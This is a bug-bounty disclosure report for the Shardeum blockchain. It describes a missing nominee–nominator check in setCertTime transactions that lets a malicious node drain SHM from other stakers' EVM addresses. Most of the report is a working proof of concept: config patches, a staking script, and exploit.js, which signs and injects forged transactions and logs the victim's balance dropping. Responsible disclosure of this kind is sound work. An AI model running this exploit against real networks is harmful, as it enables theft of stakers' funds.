# #39511 \[BC-Critical] malicious node can drain balance of other node s nominator evm address

## #39511 \[BC-Critical] Malicious node can drain balance of other node's nominator evm address

**Submitted on Jan 31st 2025 at 14:27:20 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39511
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Direct loss of funds
  * Bypassing Penalties
  * Bypassing Staking Requirements

### Description

## Description

In shardeum there is an internal transaction type called setCertTime Tx, which persumably does what it say, it is possibily used to extend the time of a stake certification. The transaction looks like this.

```javascript
{
    isInternalTx: true,
    internalTXType: 5,
    nominee: <nodepubkey>,
    timestamp: Date.now(),
    nominator: <nominatorForThatNode>,
    duration: 10
    sign: {
        sig: <signature>,
        owner: <nodepubkey>
    }
};
```

In the legitimate scenario, the nominator is the staker's evm address of node operator and nominee is node publickey and the node belong to node operator. When transaciton is applied a small amount of SHM is deducted from nominator which is staker's evm address. The problem arises in the shardeum code's failure to check the if the nominee submmitted in tx is actually nominated by the nominator when it was first staked. This mean that malicious actors can put nominee address to be his own nodepubkey and put nominator address to be other staker's address then submiting the tx. Since the tx deduct small amount of SHM from nominator, the attacker can keep submitting the tx and deducting SHM from other staker's address. This is a serious vulnerability as it can be used to drain SHM from other stakers with no cost and penalty for attacker

### Proof of Concept

### Proof of Concept

1. In a actual network node will already be staked their own operators. But since we're running the whole network locally we'll have to simulate legit network.
2. Please apply this patch to legit `shardeum` repo to act as legit network. Note that we needed to add genesis address to stake ourselves for legit nodes. But in live network nodes are already staked before the attack. In a live network with actual live attack this genesis is not needed.

```diff
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..b34c85d3 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -451,5 +451,9 @@
   },
   "0xCB65445D84D15F703813a2829bD1FD836942c9B7": {
     "wei": "1001000000000000000000"
+
+  },
+  "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266": {
+    "wei": "1001000000000000000000"
   }
-}
\ No newline at end of file
+}
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..038a0ac3 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 20,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -224,7 +224,7 @@ config = merge(config, {
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,8 +295,8 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
-      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
+        : 10, //128 is the final goal
+      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 1,
       executeInOneShard: true,
     },
     stateManager: {
```

3. Please apply this patch to malicious `shardeum` node in `shardeum` repo.

```
diff --git a/config.json b/config.json
index a3dacc59..624a4204 100644
--- a/config.json
+++ b/config.json
@@ -4,7 +4,7 @@
     "p2p": {
       "existingArchivers": [
         {
-          "ip": "localhost",
+          "ip": "0.0.0.0",
           "port": 4000,
           "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
         }
@@ -12,9 +12,9 @@
     },
     "ip": {
       "externalIp": "127.0.0.1",
-      "externalPort": 9001,
+      "externalPort": 1337,
       "internalIp": "127.0.0.1",
-      "internalPort": 10001
+      "internalPort": 11337
     },
     "reporting": {
       "report": true,
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..b34c85d3 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -451,5 +451,9 @@
   },
   "0xCB65445D84D15F703813a2829bD1FD836942c9B7": {
     "wei": "1001000000000000000000"
+
+  },
+  "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266": {
+    "wei": "1001000000000000000000"
   }
-}
No newline at end of file
+}
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..038a0ac3 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 20,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -224,7 +224,7 @@ config = merge(config, {
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,8 +295,8 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
-      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
+        : 10, //128 is the final goal
+      nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 1,
       executeInOneShard: true,
     },
     stateManager: {
```

4. Please launch the legit network with legit `shardeum` repo to about 10 nodes.
5. Please launch the malicious node by doing `node dist/src/index.js` in malicious `shardeum` repo.
6. Please wait all the nodes go active. At least 10 node should go active.
7. Let's stake the nodes to simulate live network conditions.
8. Create a new directory host our exploit and staking tool. `mkdir poc && cd poc`
9. Create a new file `stake.js` and paste the following code.

```javascript
const { ethers, HDNodeWallet } = require('ethers');
const axios = require('axios');
const { Utils} = require('@shardus/types');

const mnemonic = "test test test test test test test test test test test junk";

const rpcUrl = "http://0.0.0.0:8080";
const root_wallet = HDNodeWallet.fromPhrase(mnemonic);
const stakingMockAddress = "0x0000000000000000000000000000000000010000";
const nominee = process.argv[2];
const stakeAmount = process.argv[3] || 10;



async function main() {
    console.log("Wallet address: ", root_wallet.address);

    const wallet = ethers.Wallet.createRandom();

    const status = await transferSHM(root_wallet, wallet.address.toLowerCase(), "20");
    if (status.error) {
        console.log("Couldn't fund account: ", status.error.message);
        return
    }
    console.log("funding a staking account with 15 SHM...");
    await sleep(20 * 1000);
    await sendStakeTx(wallet);


    

}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function createStakeTx(nominator, nominee, stake = 5) {
  return {
    nominator,
    nominee,
    stake: ethers.parseEther(String(stake)).toString(),
    internalTXType: 6,
    timestamp: Date.now(),
  };
}

main();


function pickMaxNonce(nonces) {
    let max = 0;
    let maxCount = 0;
    for (let i = 0; i < nonces.length; i++) {
        let count = 0;
        for (let j = 0; j < nonces.length; j++) {
            if (nonces[j] == nonces[i])
                count++;
        }
        if (count > maxCount) {
            max = nonces[i];
            maxCount = count;
        }
    }
    return max;
}

async function getWalletNonce(wallet) {
    let promises = [];
    
    for (let i = 0; i < 15; i++) {
        promises.push(axios.post(rpcUrl, {
            jsonrpc: "2.0",
            method: "eth_getTransactionCount",
            params: [wallet.address.toLowerCase(), "latest"],
            id: 1
        }).then((resp) => {
            return resp.data;
        }))
    }

    let results = await Promise.allSettled(promises);

    let nonces = [];

    // pick majority most common nonce
    for (let promise of results) {
        if (promise.status !== "fulfilled") {
            console.log("Failed to get nonce: ", promise.reason);
            continue
        }

        nonces.push(parseInt(promise.value.result, 16));
    }

    const nonce = pickMaxNonce(nonces);

    return nonce;
}

async function sendStakeTx(wallet) {
    const stakeTx = createStakeTx(
      wallet.address.toLowerCase(),
      nominee,
      stakeAmount 
    );
    
    const nonce = await getWalletNonce(wallet);
    console.log(nonce);
    
    const chainId = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_chainId",
        params: [],
        id: 1
    }).then((resp) => {
        console.log(resp.data.result);
        return BigInt(resp.data.result);
    });
    
    console.log(stakeTx);
    
    const txParams = {
      to: stakingMockAddress,
      gasLimit: 6000000,
      value: ethers.parseEther(stakeAmount.toString()),
      data: ethers.hexlify(ethers.toUtf8Bytes(Utils.safeStringify(stakeTx))),
      nonce: nonce,
      chainId: chainId,
    };
    
      const tx = {
        type: 1,
        nonce: txParams.nonce,
        gasLimit: txParams.gasLimit,
        gasPrice: ethers.parseUnits('10', 'gwei'),
        value: txParams.value,
        to: txParams.to,

        from: wallet.address,
        data: txParams.data,
        chainId: txParams.chainId,
      };
    
    const signedTx = await wallet.signTransaction(tx);
    
    const resp2 = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_sendRawTransaction",
        params: [signedTx],
        id: 1
    }).then((resp) => {
        console.log(resp.data);
        return resp.data;
    });
    
    if (resp2.error) {
        return console.log("Staking failed: ", resp2.error.message);
    }
    
    console.log("Waiting for transaction receipt...");

    console.log("Querying transaction receipt...", resp2.result);
    await sleep(20 * 1000);
    const receipt = await queryReceipt(resp2.result);
    
    if (receipt) {
        console.log("Staking successful: ", receipt);
    }else{
        console.log("Staking failed: No transaction receipt found");
    }
}

async function transferSHM(wallet, to, amount) {

    const chainId = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_chainId",
        params: [],
        id: 1
    }).then((resp) => {
        console.log(resp.data.result);
        return BigInt(resp.data.result);
    });

  const tx = {
    to: to,      // Recipient address
    value: ethers.parseEther(amount), // Amount in ETH (converted to Wei)
    nonce: await getWalletNonce(wallet),                        // Replace with the correct nonce for the sender's account
    gasLimit: 6000000,
    gasPrice: ethers.parseUnits("30", "gwei"), // Replace with your desired gas price
    chainId: chainId                    // Mainnet chain ID (use the correct chain ID for your network)
  };

  // Sign the transaction
  const signedTx = await wallet.signTransaction(tx);

  // console.log("Signed Transaction:", signedTx);

    // Send the transaction
    const resp2 = await axios.post(rpcUrl, {
        jsonrpc: "2.0",
        method: "eth_sendRawTransaction",
        params: [signedTx],
        id: 1
    }).then((resp) => {
        // console.log(resp.data);
        return resp.data;
    });


    if (resp2.error) {
        console.log("Couldn't Fund Account", resp2.error.message);
    }

    console.log(resp2.result);

    return resp2
}

async function queryReceipt(txHash) {
    const promises = []

    for (let i = 0; i < 20; i++) {
        promises.push(axios.post(rpcUrl, {
            jsonrpc: "2.0",
            method: "eth_getTransactionReceipt",
            params: [txHash, "latest"],
            id: 1
        }).then((resp) => {
            return resp.data;
        }))
    }

    let results = await Promise.allSettled(promises);

    for (let promise of results) {
        if (promise.status !== "fulfilled") {
            continue
        }
        
        if (!promise.value.result) {
            continue;
        }

        if (promise.value.result) {
            return promise.value.result;
        }
    }
}
```

11. create a `package.json` file and paste the following code.

```json
{
  "dependencies": {
    "@ethereumjs/tx": "^5.4.0",
    "@shardus/crypto-utils": "^4.1.6",
    "@shardus/types": "^1.2.21",
    "axios": "^1.7.9",
    "ethers": "^6.13.5",
    "ethersjs": "^0.0.1-security",
    "inti": "^0.0.0"
  }
}
```

12. create a `exploit.js` file and paste the following code.

```javascript
const crypto = require('@shardus/crypto-utils');
const axios = require('axios');
const fs = require('fs');
const Utils = require('@shardus/types').Utils;


crypto.init('69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc')

async function main() {
        const jsonfile = process.argv[2];
        const victimIP = process.argv[3];
        const victimPort = process.argv[4];

        const resp = await axios.get(`http://${victimIP}:${victimPort}/nodeinfo`)
        
        const victimNodePublicKey = resp.data.nodeInfo.publicKey;
        const resp2 = await axios.get(`http://${victimIP}:${victimPort}/account/${victimNodePublicKey}`)
        const victimNodeNominator = resp2.data.account.nominator;

        console.log("Victim Node Public Key: ", victimNodePublicKey);
        console.log("Victim Node Nominator: ", victimNodeNominator);    

        const resp3 = await axios.get(`http://${victimIP}:${victimPort}/account/${victimNodeNominator}`)
        console.log("Victim Node Nominator Balance Before Attack", resp3.data.account.balance);
        console.log("Exploiting victim node: ", victimNodePublicKey);
        

    if (!jsonfile) {
        console.error("Usage: node exploit.js <path_to_json> address");
        process.exit(1);
    }
    let keypair = {}; 
    try {
            const rawData = fs.readFileSync(jsonfile, 'utf8');
            keypair = JSON.parse(rawData);
       
        } catch (error) {
            console.error("Error reading or parsing JSON file:", error.message);
        }

    let now = performance.now();
    for ( let i = 0; i < 100; i++) {
        await sleep(.5 * 1000);
        const drain = {
            isInternalTx: true,
            internalTXType: 5,
            nominee: keypair.publicKey,
            timestamp: Date.now(),
            nominator: victimNodeNominator,
            duration: 10
          };
          const objCopy = Utils.safeJsonParse(Utils.safeStringify(drain))
          const finaldrain = crypto.signObj(objCopy, keypair.secretKey, keypair.publicKey)
          const inject = await axios.post(`http://0.0.0.0:9001/inject`, finaldrain);
    }


    await sleep(15 * 1000);

    const resp4 = await axios.get(`http://${victimIP}:${victimPort}/account/${victimNodeNominator}`)
    console.log("Victim Node Nominator Balance After Attack", resp4.data.account.balance);
    console.log("Time Taken", performance.now() - now, "ms");
}
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
main()
```

13. Install the dependencies by running `npm install`
14. Now we can simulate real world condition by staking the victim node and the attacker node. !Optional you can stake all the node if you want. Make sure you have rpc server running at port 8080 too.
15. Run the `stake.js` file by running `node stake.js <nodepubkey>`.
16. Stake the victim node and malicious node `node stake.js <victimnodepubkey>` and `node stake.js <maliciousnodepubkey>`
17. You can now run the exploit by doing `node exploit.js path/to/malicious/shardeum/repo/secrets.json <victimnodeip> <victimnodeport>`. This will drain the victim node's balance. Example `node exploit.js path/to/secrets.json 0.0.0.0 9001`. We're using malicious node keypar in secrets.json to submit the setCertTime Tx.\
    18 You should be able to see output similar to following. Each transaction drain 0.01 SHM to the victim node operator evm address. In our exploit we are sending 100 transactions. with 2tps so within 1minute we're able to drain 1 SHM from victim node operator. In a live network with many node with more TPS can drain more SHM faster.

```
Victim Node Public Key:  382b02763bf164e999a4e273d81d46b83872d42c57fc1031d35fdfc9bf757c74
Victim Node Nominator:  0xa8dd61876296013ba685b605f9468c7f3b3e02f0
Victim Node Nominator Balance Before Attack 8990000000000000000
Exploiting victim node:  382b02763bf164e999a4e273d81d46b83872d42c57fc1031d35fdfc9bf757c74
Victim Node Nominator Balance After Attack 8180000000000000000
Time Taken 65825.06255399995 ms
```

19. You can also cross check that vitim node's nominator balance has been drained by checking from rpc server.

```
curl -X POST http://0.0.0.0:8080 \
     -H "Content-Type: application/json" \
     --data '{
       "jsonrpc": "2.0",
       "method": "eth_getBalance",
       "params": ["Victim Node's nominator address", "latest"],
       "id": 1
     }'
```

## Impact

A malicious actor can drain the SHM from EVM address that are not of his own leading to loss of funds without any penalies or cost to the attacker. The attack will continued to work even if malicious node is deactivated or dead.
